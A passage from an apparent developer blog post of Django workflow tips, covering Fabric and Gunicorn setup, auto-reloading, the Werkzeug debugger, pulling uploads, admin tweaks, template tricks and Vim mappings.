migrate --fake &#39;</span> <span>+</span> <span>args</span><span>))</span>\n\n<span>def</span> <span>migrate_reset</span><span>(</span><span>args</span><span>=</span><span>&#39;&#39;</span><span>):</span>\n    <span>&#39;&#39;&#39;Run any needed migrations with --fake.  No, seriously.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py migrate --fake --delete-ghost-migrations &#39;</span> <span>+</span> <span>args</span><span>))</span>\n</pre></div>\n\n\n<p>Remember that running a migration without specifying an app will migrate everything,\nso a simple <code>fab dev migrate</code> will do the trick.</p>\n<h2>Watching for Changes</h2>\n<p>When developing locally you’ll want to make a change to your code and have the server\nreload that code automatically.  The Django development server does this, and we can\nhack it into our Vagrant/Gunicorn setup too.</p>\n<p>First, add a <code>monitor.py</code> file at the root of your project (I believe I found this\ncode <a href=\"http://code.google.com/p/modwsgi/wiki/ReloadingSourceCode\">here</a>, but I may be wrong):</p>\n<div><pre><span>import</span> <span>os</span>\n<span>import</span> <span>sys</span>\n<span>import</span> <span>time</span>\n<span>import</span> <span>signal</span>\n<span>import</span> <span>threading</span>\n<span>import</span> <span>atexit</span>\n<span>import</span> <span>Queue</span>\n\n<span>_interval</span> <span>=</span> <span>1.0</span>\n<span>_times</span> <span>=</span> <span>{}</span>\n<span>_files</span> <span>=</span> <span>[]</span>\n\n<span>_running</span> <span>=</span> <span>False</span>\n<span>_queue</span> <span>=</span> <span>Queue</span><span>.</span><span>Queue</span><span>()</span>\n<span>_lock</span> <span>=</span> <span>threading</span><span>.</span><span>Lock</span><span>()</span>\n\n<span>def</span> <span>_restart</span><span>(</span><span>path</span><span>):</span>\n    <span>_queue</span><span>.</span><span>put</span><span>(</span><span>True</span><span>)</span>\n    <span>prefix</span> <span>=</span> <span>&#39;monitor (pid=</span><span>%d</span><span>):&#39;</span> <span>%</span> <span>os</span><span>.</span><span>getpid</span><span>()</span>\n    <span>print</span> <span>&gt;&gt;</span> <span>sys</span><span>.</span><span>stderr</span><span>,</span> <span>&#39;</span><span>%s</span><span> Change detected to </span><span>\\&#39;</span><span>%s</span><span>\\&#39;</span><span>.&#39;</span> <span>%</span> <span>(</span><span>prefix</span><span>,</span> <span>path</span><span>)</span>\n    <span>print</span> <span>&gt;&gt;</span> <span>sys</span><span>.</span><span>stderr</span><span>,</span> <span>&#39;</span><span>%s</span><span> Triggering process restart.&#39;</span> <span>%</span> <span>prefix</span>\n    <span>os</span><span>.</span><span>kill</span><span>(</span><span>os</span><span>.</span><span>getpid</span><span>(),</span> <span>signal</span><span>.</span><span><span><span>SIGINT</span></span></span><span>)</span>\n\n<span>def</span> <span>_modified</span><span>(</span><span>path</span><span>):</span>\n    <span>try</span><span>:</span>\n        <span># If path doesn&#39;t denote a file and were previously</span>\n        <span># tracking it, then it has been removed or the file type</span>\n        <span># has changed so force a restart. If not previously</span>\n        <span># tracking the file then we can ignore it as probably</span>\n        <span># pseudo reference such as when file extracted from a</span>\n        <span># collection of modules contained in a zip file.</span>\n\n        <span>if</span> <span>not</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>isfile</span><span>(</span><span>path</span><span>):</span>\n            <span>return</span> <span>path</span> <span>in</span> <span>_times</span>\n\n        <span># Check for when file last modified.</span>\n\n        <span>mtime</span> <span>=</span> <span>os</span><span>.</span><span>stat</span><span>(</span><span>path</span><span>)</span><span>.</span><span>st_mtime</span>\n        <span>if</span> <span>path</span> <span>not</span> <span>in</span> <span>_times</span><span>:</span>\n            <span>_times</span><span>[</span><span>path</span><span>]</span> <span>=</span> <span>mtime</span>\n\n        <span># Force restart when modification time has changed, even</span>\n        <span># if time now older, as that could indicate older file</span>\n        <span># has been restored.</span>\n\n        <span>if</span> <span>mtime</span> <span>!=</span> <span>_times</span><span>[</span><span>path</span><span>]:</span>\n            <span>return</span> <span>True</span>\n    <span>except</span><span>:</span>\n        <span># If any exception occured, likely that file has been</span>\n        <span># been removed just before stat(), so force a restart.</span>\n\n        <span>return</span> <span>True</span>\n\n    <span>return</span> <span>False</span>\n\n<span>def</span> <span>_monitor</span><span>():</span>\n    <span>while</span> <span>1</span><span>:</span>\n        <span># Check modification times on all files in sys.modules.</span>\n\n        <span>for</span> <span>module</span> <span>in</span> <span>sys</span><span>.</span><span>modules</span><span>.</span><span>values</span><span>():</span>\n            <span>if</span> <span>not</span> <span>hasattr</span><span>(</span><span>module</span><span>,</span> <span>&#39;__file__&#39;</span><span>):</span>\n                <span>continue</span>\n            <span>path</span> <span>=</span> <span>getattr</span><span>(</span><span>module</span><span>,</span> <span>&#39;__file__&#39;</span><span>)</span>\n            <span>if</span> <span>not</span> <span>path</span><span>:</span>\n                <span>continue</span>\n            <span>if</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>splitext</span><span>(</span><span>path</span><span>)[</span><span>1</span><span>]</span> <span>in</span> <span>[</span><span>&#39;.pyc&#39;</span><span>,</span> <span>&#39;.pyo&#39;</span><span>,</span> <span>&#39;.pyd&#39;</span><span>]:</span>\n                <span>path</span> <span>=</span> <span>path</span><span>[:</span><span>-</span><span>1</span><span>]</span>\n            <span>if</span> <span>_modified</span><span>(</span><span>path</span><span>):</span>\n                <span>return</span> <span>_restart</span><span>(</span><span>path</span><span>)</span>\n\n        <span># Check modification times on files which have</span>\n        <span># specifically been registered for monitoring.</span>\n\n        <span>for</span> <span>path</span> <span>in</span> <span>_files</span><span>:</span>\n            <span>if</span> <span>_modified</span><span>(</span><span>path</span><span>):</span>\n                <span>return</span> <span>_restart</span><span>(</span><span>path</span><span>)</span>\n\n        <span># Go to sleep for specified interval.</span>\n\n        <span>try</span><span>:</span>\n            <span>return</span> <span>_queue</span><span>.</span><span>get</span><span>(</span><span>timeout</span><span>=</span><span>_interval</span><span>)</span>\n        <span>except</span><span>:</span>\n            <span>pass</span>\n\n<span>_thread</span> <span>=</span> <span>threading</span><span>.</span><span>Thread</span><span>(</span><span>target</span><span>=</span><span>_monitor</span><span>)</span>\n<span>_thread</span><span>.</span><span>setDaemon</span><span>(</span><span>True</span><span>)</span>\n\n<span>def</span> <span>_exiting</span><span>():</span>\n    <span>try</span><span>:</span>\n        <span>_queue</span><span>.</span><span>put</span><span>(</span><span>True</span><span>)</span>\n    <span>except</span><span>:</span>\n        <span>pass</span>\n    <span>_thread</span><span>.</span><span>join</span><span>()</span>\n\n<span>atexit</span><span>.</span><span>register</span><span>(</span><span>_exiting</span><span>)</span>\n\n<span>def</span> <span>track</span><span>(</span><span>path</span><span>):</span>\n    <span>if</span> <span>not</span> <span>path</span> <span>in</span> <span>_files</span><span>:</span>\n        <span>_files</span><span>.</span><span>append</span><span>(</span><span>path</span><span>)</span>\n\n<span>def</span> <span>start</span><span>(</span><span>interval</span><span>=</span><span>1.0</span><span>):</span>\n    <span>global</span> <span>_interval</span>\n    <span>if</span> <span>interval</span> <span>&lt;</span> <span>_interval</span><span>:</span>\n        <span>_interval</span> <span>=</span> <span>interval</span>\n\n    <span>global</span> <span>_running</span>\n    <span>_lock</span><span>.</span><span>acquire</span><span>()</span>\n    <span>if</span> <span>not</span> <span>_running</span><span>:</span>\n        <span>prefix</span> <span>=</span> <span>&#39;monitor (pid=</span><span>%d</span><span>):&#39;</span> <span>%</span> <span>os</span><span>.</span><span>getpid</span><span>()</span>\n        <span>print</span> <span>&gt;&gt;</span> <span>sys</span><span>.</span><span>stderr</span><span>,</span> <span>&#39;</span><span>%s</span><span> Starting change monitor.&#39;</span> <span>%</span> <span>prefix</span>\n        <span>_running</span> <span>=</span> <span>True</span>\n        <span>_thread</span><span>.</span><span>start</span><span>()</span>\n    <span>_lock</span><span>.</span><span>release</span><span>()</span>\n</pre></div>\n\n\n<p>Next add a <code>post_fork</code> hook to your Gunicorn config file that uses the monitor to\nwatch for changes:</p>\n<div><pre><span>def</span> <span>post_fork</span><span>(</span><span>server</span><span>,</span> <span>worker</span><span>):</span>\n    <span>import</span> <span>monitor</span>\n    <span>import</span> <span>local_settings</span>\n    <span>if</span> <span>local_settings</span><span>.</span><span><span><span>DEBUG</span></span></span><span>:</span>\n        <span>server</span><span>.</span><span>log</span><span>.</span><span>info</span><span>(</span><span>&quot;Starting change monitor.&quot;</span><span>)</span>\n        <span>monitor</span><span>.</span><span>start</span><span>(</span><span>interval</span><span>=</span><span>1.0</span><span>)</span>\n</pre></div>\n\n\n<p>Now the Gunicorn server will automatically restart whenever code is changed.  Use\nwhatever method for determining debug status that you like.  We use\n<code>local_settings.py</code> files which all have <code>DEBUG</code> variables, so that works for us.</p>\n<p>It will <em>not</em> restart when you add new code (e.g. when you install a new app), so\nyou’ll need to handle that manually with <code>fab dev restart</code>, but that’s not too bad!</p>\n<h3>Using the Werkzeug Debugger with Gunicorn</h3>\n<p>The final piece of the puzzle is being able to use the fantastic <a href=\"http://werkzeug.pocoo.org/docs/debug/\">Werkzeug\nDebugger</a> while running on the development <span><span>VM</span></span> with Gunicorn.</p>\n<p>To do this, create a <code>debug_wsgi.py</code> file at the root of your project:</p>\n<div><pre><span>import</span> <span>os</span>\n<span>import</span> <span>sys</span>\n<span>import</span> <span>site</span>\n\n<span>parent</span> <span>=</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>dirname</span>\n<span>site_dir</span> <span>=</span> <span>parent</span><span>(</span><span>os</span><span>.</span><span>path</span><span>.</span><span>abspath</span><span>(</span><span>__file__</span><span>))</span>\n<span>project_dir</span> <span>=</span> <span>parent</span><span>(</span><span>parent</span><span>(</span><span>os</span><span>.</span><span>path</span><span>.</span><span>abspath</span><span>(</span><span>__file__</span><span>)))</span>\n\n<span>sys</span><span>.</span><span>path</span><span>.</span><span>insert</span><span>(</span><span>0</span><span>,</span> <span>project_dir</span><span>)</span>\n<span>sys</span><span>.</span><span>path</span><span>.</span><span>insert</span><span>(</span><span>0</span><span>,</span> <span>site_dir</span><span>)</span>\n\n<span>site</span><span>.</span><span>addsitedir</span><span>(</span><span>&#39;VIRTUALENV_SITE_PACKAGES&#39;</span><span>)</span>\n\n<span>from</span> <span>django.core.management</span> <span>import</span> <span>setup_environ</span>\n<span>import</span> <span>settings</span>\n<span>setup_environ</span><span>(</span><span>settings</span><span>)</span>\n\n<span>import</span> <span>django.core.handlers.wsgi</span>\n<span>application</span> <span>=</span> <span>django</span><span>.</span><span>core</span><span>.</span><span>handlers</span><span>.</span><span>wsgi</span><span>.</span><span>WSGIHandler</span><span>()</span>\n\n<span>from</span> <span>werkzeug.debug</span> <span>import</span> <span>DebuggedApplication</span>\n<span>application</span> <span>=</span> <span>DebuggedApplication</span><span>(</span><span>application</span><span>,</span> <span>evalex</span><span>=</span><span>True</span><span>)</span>\n\n<span>def</span> <span>null_technical_500_response</span><span>(</span><span>request</span><span>,</span> <span>exc_type</span><span>,</span> <span>exc_value</span><span>,</span> <span>tb</span><span>):</span>\n    <span>raise</span> <span>exc_type</span><span>,</span> <span>exc_value</span><span>,</span> <span>tb</span>\n<span>from</span> <span>django.views</span> <span>import</span> <span>debug</span>\n<span>debug</span><span>.</span><span>technical_500_response</span> <span>=</span> <span>null_technical_500_response</span>\n</pre></div>\n\n\n<p>Have Gunicorn use this file to run your development server with <code>gunicorn\ndebug_wsgi:application</code>.</p>\n<p>Make sure to replace <code>'VIRTUALENV_SITE_PACKAGES'</code> with the <em>full</em> path to your\nvirtualenv’s <code>site_packages</code> directory.  You might want to make this a setting in\na machine-specific settings file.</p>\n<h3>Pulling Uploads</h3>\n<p>Once you give a client access to a site they’ll probably be uploading images (through\nDjango’s built-in file uploading features or with <a href=\"http://code.google.com/p/django-filebrowser/\">django-filebrowser</a>).</p>\n<p>When you’re making changes locally it’s often useful to have these uploaded files on\nyour local <span><span>VM</span></span>, otherwise you end up with a bunch of broken images.</p>\n<p>Here’s a simple Fabric task that will pull down all the uploads from the server:</p>\n<div><pre><span>def</span> <span>pull_uploads</span><span>():</span>\n    <span>&#39;&#39;&#39;Copy the uploads from the site to your local machine.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;uploads_path&#39;</span><span>)</span>\n\n    <span>sudo</span><span>(</span><span>&#39;chmod -R a+r &quot;</span><span>%s</span><span>&quot;&#39;</span> <span>%</span> <span>env</span><span>.</span><span>uploads_path</span><span>)</span>\n\n    <span>rsync_command</span> <span>=</span> <span>r&quot;&quot;&quot;rsync -av -e &#39;ssh -p </span><span>%s</span><span>&#39; </span><span>%s</span><span>@</span><span>%s</span><span>:</span><span>%s</span><span> </span><span>%s</span><span>&quot;&quot;&quot;</span> <span>%</span> <span>(</span>\n        <span>env</span><span>.</span><span>port</span><span>,</span>\n        <span>env</span><span>.</span><span>user</span><span>,</span> <span>env</span><span>.</span><span>host</span><span>,</span>\n        <span>env</span><span>.</span><span>uploads_path</span><span>.</span><span>rstrip</span><span>(</span><span>&#39;/&#39;</span><span>)</span> <span>+</span> <span>&#39;/&#39;</span><span>,</span>\n        <span>&#39;media/uploads&#39;</span>\n    <span>)</span>\n    <span>print</span> <span>local</span><span>(</span><span>rsync_command</span><span>,</span> <span>capture</span><span>=</span><span>False</span><span>)</span>\n</pre></div>\n\n\n<p>You might be wondering about the line that strips <code>/</code> characters and then adds them\nback in.  <code>rsync</code> does different things depending on whether you end a path with\na <code>/</code>, so this is actually pretty important.</p>\n<p>In your host task you’ll need to set the <code>uploads_path</code> variable to something like this:</p>\n<div><pre><span>import</span> <span>os</span>\n<span>env</span><span>.</span><span>site_path</span> <span>=</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>join</span><span>(</span><span>&#39;var&#39;</span><span>,</span> <span>&#39;www&#39;</span><span>,</span> <span>&#39;myproject&#39;</span><span>)</span>\n<span>env</span><span>.</span><span>uploads_path</span> <span>=</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>join</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>,</span> <span>&#39;media&#39;</span><span>,</span> <span>&#39;uploads&#39;</span><span>)</span>\n</pre></div>\n\n\n<p>Now you can run <code>fab production pull_uploads</code> to pull down all the files people have\nuploaded to the production server.</p>\n<h3>Preventing Accidents</h3>\n<p>Deploying to test and staging servers should be quick and easy. Deploying to\nproduction servers should be harder to prevent people from accidentally doing it.</p>\n<p>I’ve created a little function that I call before deploying to production servers.\nIt forces me to type in random words from the system word list before proceeding to\nmake sure I <em>really</em> know what I’m doing:</p>\n<div><pre><span>import</span> <span>os</span><span>,</span> <span>random</span>\n\n<span>from</span> <span>fabric.api</span> <span>import</span> <span>*</span>\n<span>from</span> <span>fabric.operations</span> <span>import</span> <span>prompt</span>\n<span>from</span> <span>fabric.utils</span> <span>import</span> <span>abort</span>\n\n<span>WORDLIST_PATHS</span> <span>=</span> <span>[</span><span>os</span><span>.</span><span>path</span><span>.</span><span>join</span><span>(</span><span>&#39;/&#39;</span><span>,</span> <span>&#39;usr&#39;</span><span>,</span> <span>&#39;share&#39;</span><span>,</span> <span>&#39;dict&#39;</span><span>,</span> <span>&#39;words&#39;</span><span>)]</span>\n<span>DEFAULT_MESSAGE</span> <span>=</span> <span>&quot;Are you sure you want to do this?&quot;</span>\n<span>WORD_PROMPT</span> <span>=</span> <span>&#39;  [</span><span>%d</span><span>/</span><span>%d</span><span>] Type &quot;</span><span>%s</span><span>&quot; to continue (^C quits): &#39;</span>\n\n<span>def</span> <span>prevent_horrible_accidents</span><span>(</span><span>msg</span><span>=</span><span>DEFAULT_MESSAGE</span><span>,</span> <span>horror_rating</span><span>=</span><span>1</span><span>):</span>\n    <span>&quot;&quot;&quot;Prompt the user to enter random words to prevent doing something stupid.&quot;&quot;&quot;</span>\n\n    <span>valid_wordlist_paths</span> <span>=</span> <span>[</span><span>wp</span> <span>for</span> <span>wp</span> <span>in</span> <span>WORDLIST_PATHS</span> <span>if</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>exists</span><span>(</span><span>wp</span><span>)]</span>\n\n    <span>if</span> <span>not</span> <span>valid_wordlist_paths</span><span>:</span>\n        <span>abort</span><span>(</span><span>&#39;No wordlists found!&#39;</span><span>)</span>\n\n    <span>with</span> <span>open</span><span>(</span><span>valid_wordlist_paths</span><span>[</span><span>0</span><span>])</span> <span>as</span> <span>wordlist_file</span><span>:</span>\n        <span>words</span> <span>=</span> <span>wordlist_file</span><span>.</span><span>readlines</span><span>()</span>\n\n    <span>print</span> <span>msg</span>\n\n    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>int</span><span>(</span><span>horror_rating</span><span>)):</span>\n        <span>word</span> <span>=</span> <span>words</span><span>[</span><span>random</span><span>.</span><span>randint</span><span>(</span><span>0</span><span>,</span> <span>len</span><span>(</span><span>words</span><span>))]</span><span>.</span><span>strip</span><span>()</span>\n        <span>p_msg</span> <span>=</span> <span>WORD_PROMPT</span> <span>%</span> <span>(</span><span>i</span><span>+</span><span>1</span><span>,</span> <span>horror_rating</span><span>,</span> <span>word</span><span>)</span>\n        <span>answer</span> <span>=</span> <span>prompt</span><span>(</span><span>p_msg</span><span>,</span> <span>validate</span><span>=</span><span>r&#39;^</span><span>%s</span><span>$&#39;</span> <span>%</span> <span>word</span><span>)</span>\n</pre></div>\n\n\n<p>You may need to adjust <code>WORDLIST_PATHS</code> if you’re not on <span><span>OS</span></span> X.</p>\n<h2>Working with Third-Party Apps</h2>\n<p>One of the best parts about working with Django is that many problems have already\nbeen solved and the solutions have been released as open-source applications.</p>\n<p>We use quite a few open-source apps, and there are a couple of tricks I’ve learned to\nmake working with them easier.</p>\n<h3>Installing Apps from Repositories</h3>\n<p>If I’m going to use an open-source Django app in a project I’ll almost always install\nit as an editable repository on the <span><span>VM</span></span> with <code>pip install -e</code>.</p>\n<p>Others may disagree with me on this, but I think it’s the best way to work.</p>\n<p>Often I’ll find a bug that I think may be in one of the third-party apps I’m using.\nInstalling the apps as repositories makes it easy to read their source and figure out\nif the bug is really in the app.</p>\n<p>If the bug <em>is</em> in the third-party app having the app installed as a repository makes\nit simple to fix the bug, fork the project on BitBucket or GitHub, send a pull\nrequest, and get back to work.</p>\n<h3>Mirroring Repositories</h3>\n<p>One problem we’ve run into at Dumbwaiter is that the repos for third-party apps we\nuse are scattered across GitHub, BitBucket, Google Code, and other servers.  If any\none of these services goes down we’re stuck waiting for it to come back up.</p>\n<p>A while ago I took half a day and consolidated all of these repos onto one of the\nservers that we control.  The basic process went like this:</p>\n<ul>\n<li>Use <a href=\"http://hg-git.github.com/\">hg-git</a> and <a href=\"https://bitbucket.org/durin42/hgsubversion/wiki/Home\">hgsubversion</a> to convert the git and <span><span>SVN</span></span> repos to Mercurial repos.</li>\n<li>Set up a master <code>mirror</code> Mercurial repo with all the app repos as subrepos.</li>\n<li>Push the master repo and all the subrepos up to one of our Linodes.</li>\n</ul>\n<p>Now we can use <code>-e ssh://hg@OUR_LINODE/mirror/APP@REV_THAT_WORKS#egg=APP</code> in our\n<code>requirements.txt</code> files to install apps from our mirror.  When we want to update our\ndependencies we can simply pull from the upstream repos and commit in the mirror repo.</p>\n<p>If our mirror goes down it’s not a big deal, because we have far bigger problems to\nworry about than new projects.</p>\n<p>I wrote a few scripts to automate updating apps and such, but they’re extremely hacky\nso I don’t want to post them here.  Take half a day and write your own set — it’s\ndefinitely worth it to have your own mirror of your specific dependencies.</p>\n<h3>Using <span><span>BCVI</span></span> to Edit Files</h3>\n<p>I said that when I find a bug that I think is in a third-party app I’ll poke around\nwith the app and try to figure it out.  But since all the apps are installed in\na virtualenv on the Vagrant <span><span>VM</span></span> it might seem like it’s a pain in the ass to edit those files!</p>\n<p>Luckily <a href=\"http://sshmenu.sourceforge.net/articles/bcvi/\"><span><span>BCVI</span></span></a> exists.  It’s a utility that opens a “back channel” to your local\nmachine when you <span><span>SSH</span></span> and lets you run <code>vi FILE</code> to open that file in\nVim/MacVim/GVim/etc on your <em>local</em> machine.  When you save the file it uploads it\nback to the server automatically for you.</p>\n<p>It can be a bit tricky to set up, but it’s worth it. Trust me.</p>\n<h2>Improving the Admin Interface</h2>\n<p>I’m going to be honest: Django’s admin interface is the main reason I’m still using\nit.  Other frameworks like <a href=\"http://flask.pocoo.org/\">Flask</a> are great, but Django’s admin saves me\n<em>ridiculous</em> amounts of time when I’m making simple <span><span>CRUD</span></span> sites for clients.</p>\n<p>That said, the Django admin isn’t the prettiest thing around, but we can give it a facelift.</p>\n<h3>Enter Grappelli</h3>\n<p><a href=\"http://django-grappelli.readthedocs.org/\">Grappelli</a> is a Django app that reskins the admin interface beautifully.  It also\nadds some functionality like drag-and-drop reordering of inlines, and allows you to\ncustomize the dashboard to your liking.  <em>Every</em> Django site I work on uses Grappelli\n— it’s just that good.</p>\n<p>The downside of Grappelli is that it changes quite a lot and breaks backwards\ncompatibility at the drop of a hat.</p>\n<p>If you’re going to use Grappelli you <em>must</em> freeze your requirements.txt files and\nwork with a single version at a time.  Trying to always work from the trunk will make you drink.</p>\n<h3>An Ugly Hack to Show Usable Foreign Key Fields</h3>\n<p>A limitation of both Grappelli and the stock Django admin is that it seems like you\ncan’t easily show fields from related models in the admin list view.</p>\n<p>For example, if you’re new to Django you might expect this to work:</p>\n<div><pre><span>class</span> <span>BlogEntryAdmin</span><span>(</span><span>admin</span><span>.</span><span>ModelAdmin</span><span>):</span>\n    <span>list_display</span> <span>=</span> <span>(</span><span>&#39;title&#39;</span><span>,</span> <span>&#39;author__name&#39;</span><span>)</span>\n</pre></div>\n\n\n<p>Unfortunately Django chokes on the <code>author__name</code> lookup.  You can <em>display</em> the name\nwithout too much fuss:</p>\n<div><pre><span>class</span> <span>BlogEntryAdmin</span><span>(</span><span>admin</span><span>.</span><span>ModelAdmin</span><span>):</span>\n    <span>list_display</span> <span>=</span> <span>(</span><span>&#39;title&#39;</span><span>,</span> <span>&#39;author_name&#39;</span><span>)</span>\n\n    <span>def</span> <span>author_name</span><span>(</span><span>self</span><span>,</span> <span>obj</span><span>):</span>\n        <span>return</span> <span>obj</span><span>.</span><span>name</span>\n</pre></div>\n\n\n<p>That will display the name just fine.  However, it won’t be a fully-fledged column in\nthe Django admin because you can’t sort on it.</p>\n<p>It may seem like this is the end — if it could be a fully-functional field, why\nwouldn’t Django just let you use <code>author__name</code>?  Luckily we can add one more line to\nfix the problem:</p>\n<div><pre><span>class</span> <span>BlogEntryAdmin</span><span>(</span><span>admin</span><span>.</span><span>ModelAdmin</span><span>):</span>\n    <span>list_display</span> <span>=</span> <span>(</span><span>&#39;title&#39;</span><span>,</span> <span>&#39;author_name&#39;</span><span>)</span>\n\n    <span>def</span> <span>author_name</span><span>(</span><span>self</span><span>,</span> <span>obj</span><span>):</span>\n        <span>return</span> <span>obj</span><span>.</span><span>name</span>\n    <span>author_name</span><span>.</span><span>admin_order_field</span> <span>=</span> <span>&#39;author__name&#39;</span>\n</pre></div>\n\n\n<p>Now the author name has all the functionality of a real <code>list_display</code> entry.</p>\n<h2>Using Django-Annoying</h2>\n<p>If you haven’t heard of <a href=\"https://bitbucket.org/offline/django-annoying/wiki/Home\">django-annoying</a> you should definitely check it out.  It’s\ngot a bunch of miscellaneous functions that fix some common, annoying parts of Django.</p>\n<p>My two personal favorites from the package are a pair of decorators that help make\nyour views much, much cleaner.</p>\n<h3>The render_to Decorator</h3>\n<p>The decorator is called <code>render_to</code> and it eliminates the ugly <code>render_to_response</code>\ncalls that Django normally forces you to use in every single view.</p>\n<p>Normally you’d use something like this:</p>\n<div><pre><span>def</span> <span>videos</span><span>(</span><span>request</span><span>):</span>\n    <span>videos</span> <span>=</span> <span>Video</span><span>.</span><span>objects</span><span>.</span><span>all</span><span>()</span>\n    <span>return</span> <span>render_to_response</span><span>(</span><span>&#39;video_list.html&#39;</span><span>,</span> <span>{</span> <span>&#39;videos&#39;</span><span>:</span> <span>videos</span> <span>},</span>\n                              <span>context_instance</span><span>=</span><span>RequestContext</span><span>(</span><span>request</span><span>))</span>\n</pre></div>\n\n\n<p>With <code>render_to</code> your view gets much cleaner:</p>\n<div><pre><span>@render_to</span><span>(</span><span>&#39;video_list.html&#39;</span><span>)</span>\n<span>def</span> <span>videos</span><span>(</span><span>request</span><span>):</span>\n    <span>videos</span> <span>=</span> <span>Video</span><span>.</span><span>objects</span><span>.</span><span>all</span><span>()</span>\n    <span>return</span> <span>{</span> <span>&#39;videos&#39;</span><span>:</span> <span>videos</span> <span>}</span>\n</pre></div>\n\n\n<p>Less typing <code>context_instance=...</code> over and over, and less syntax to remember.</p>\n<p>Yes, I know about Django 1.3’s <code>render</code> shortcut.  You have to type <code>request</code> every\nsingle time with <code>render</code>, so the <code>render_to</code> decorator still wins.</p>\n<h3>The ajax_request Decorator</h3>\n<p>The <code>ajax_request</code> decorator is like <code>render_to</code> for <span><span>AJAX</span></span> requests.  You simply\nreturn a Python dictionary from your view and the decorator handles the <span><span>JSON</span></span> encoding and such:</p>\n<div><pre><span>@ajax_request</span>\n<span>def</span> <span>ajax_get_entries</span><span>(</span><span>request</span><span>):</span>\n    <span>blog_entries</span> <span>=</span> <span>BlogEntry</span><span>.</span><span>objects</span><span>.</span><span>all</span><span>()</span>\n    <span>return</span> <span>{</span> <span>&#39;entries&#39;</span><span>:</span> <span>[(</span><span>entry</span><span>.</span><span>title</span><span>,</span> <span>entry</span><span>.</span><span>get_absolute_url</span><span>())</span>\n                         <span>for</span> <span>entry</span> <span>in</span> <span>entries</span><span>]}</span>\n</pre></div>\n\n\n<h2>Templating Tricks</h2>\n<p>I’m not a frontend developer, but I’ve done my share of <span><span>HTML</span></span> hacking at Dumbwaiter.\nHere are a few of the tricks I’ve learned.</p>\n<h3>Null Checks and Fallbacks</h3>\n<p>A common pattern I see in Django templates looks like this:</p>\n<div><pre><span>{%</span> <span>if</span> <span>business.title</span> <span>%}</span><span></span>\n<span>    </span><span>{{</span> <span>business.title</span> <span>}}</span><span></span>\n<span>{%</span> <span>else</span> <span>%}</span><span></span>\n<span>    </span><span>{{</span> <span>business.short_title</span> <span>}}</span><span></span>\n<span>{%</span> <span>endif</span> <span>%}</span><span></span>\n</pre></div>\n\n\n<p>Here’s a simpler way to do that:</p>\n<div><pre><span>{%</span> <span>firstof</span> <span>business.title</span> <span>business.short_title</span> <span>%}</span><span></span>\n</pre></div>\n\n\n<p><code>firstof</code> will return the first non-Falsy item in its arguments.</p>\n<h3>Manipulating Query Strings</h3>\n<p>Query strings are normally not a big deal, but every once in a while you’ll have\na model listing page where you need to filter by category, and number of spaces, and\ntags, etc all at once.</p>\n<p>If you’re trying to manage <span><span>GET</span></span> queries manually it can get pretty hairy very fast.</p>\n<p><a href=\"http://djangosnippets.org/snippets/2237/\">This Django snippet</a> makes working with query strings in templates a breeze.</p>\n<h3>Satisfying Your Designer with Typogrify</h3>\n<p>If you haven’t heard of <a href=\"http://code.google.com/p/typogrify/\">Typogrify</a> you should take a look at it.  It makes it easy\nto add all the typographic goodness your designers are looking for.</p>\n<h2>The Flat Page Trainwreck</h2>\n<p>Creating a site for a client is very different than creating a site for yourself.\nFor pretty much every client we’ve dealt with we’ve heard: “can’t we just create\na new page at /drink-special/ for this special deal we’re running?”</p>\n<p>Having clients go through you to make new pages is simply too much overhead.  We\nneeded a way to let clients create new pages (like <code>/drink-special/</code>) on the fly,\nwithout our intervention.</p>\n<p>Django has a “flatpages” app that solves this problem. Kind of.</p>\n<p>When using flat pages clients need to do two things that are often too much for non-technical people:</p>\n<ul>\n<li>Manage URLs manually.</li>\n<li>Write all content as raw <span><span>HTML</span></span> in a single text field.</li>\n</ul>\n<p>We’ve tried a lot of Django <span><span>CMS</span></span> apps at Dumbwaiter, and none of them made us happy.\nThey all seemed to have some or all of the following problems:</p>\n<ul>\n<li>They take over your site and make you write a “Django-WhateverCMS site” instead of\n  a “Django site”.</li>\n<li>They’re extremely feature-rich and complicated with features like\n  internationalization, redirects, versions, and many others.  This is great if you\n  need the flexibility, but bad if your clients just need to create a couple of pages.</li>\n<li>They break <code>APPEND_TRAILING_SLASH</code> and make you clutter your <code>urls.py</code> files with\n  a bunch of extra code ot handle this.</li>\n</ul>\n<p>I finally got fed up and wrote my own Django <span><span>CMS</span></span> app: <a href=\"http://stoat.rtfd.org/\">Stoat</a>.  Stoat is designed\nto be sleek, with only the features that our clients need.</p>\n<p>It’s not officially version 1.0 yet, but we’re using it for a few clients and it’s\nworking well.  Check it out if you’re looking for a more lightweight <span><span>CMS</span></span> app.</p>\n<h2>Editing with Vim</h2>\n<p>I <a href=\"http://stevelosh.com/blog/2010/09/coming-home-to-vim/\">use Vim</a> to edit everything.  Naturally I’ve found a bunch of plugins,\nmappings and other tricks that make it even better when working on Django projects.</p>\n<h3>Vim for Django</h3>\n<p>There are a lot of ways to make Vim work with Django.  I won’t go into all of them in\nthis post, but a good place to start is <a href=\"https://code.djangoproject.com/wiki/UsingVimWithDjango\">this Django wiki page</a>.</p>\n<h3>Filetype Mappings</h3>\n<p>Most files in a Django project have one of two extensions: <code>.py</code> and <code>.html</code>.\nUnfortunately these extensions aren’t unique to Django, so Vim doesn’t automatically\nset the correct <code>filetype</code> when you open one.</p>\n<p>I’ve added a few mappings to my <code>.vimrc</code> to make it quick and easy to set the correct\n<code>filetype</code>:</p>\n<div><pre><span>nnoremap</span> _dt :<span>set</span> <span>ft</span><span>=</span>htmldjango<span>&lt;</span><span><span>CR</span></span><span>&gt;</span>\n<span>nnoremap</span> _pd :<span>set</span> <span>ft</span><span>=</span>python.django<span>&lt;</span><span><span>CR</span></span><span>&gt;</span>\n</pre></div>\n\n\n<p>I also have a few autocommands that set the filetype for me when I’m editing a file\nwhose name 